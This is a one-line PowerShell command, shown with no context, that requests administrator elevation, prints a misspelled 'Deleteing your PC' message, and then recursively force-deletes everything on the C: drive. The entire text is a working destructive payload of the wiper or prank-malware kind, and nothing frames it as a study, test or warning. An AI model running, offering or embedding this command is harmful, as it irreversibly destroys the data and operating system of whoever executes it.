Start-Process powershell.exe -Verb runAs -ArgumentList "Write-Host Deleteing your PC...;Get-ChildItem C:\ -Recurse | Remove-Item -Force -Recurse"
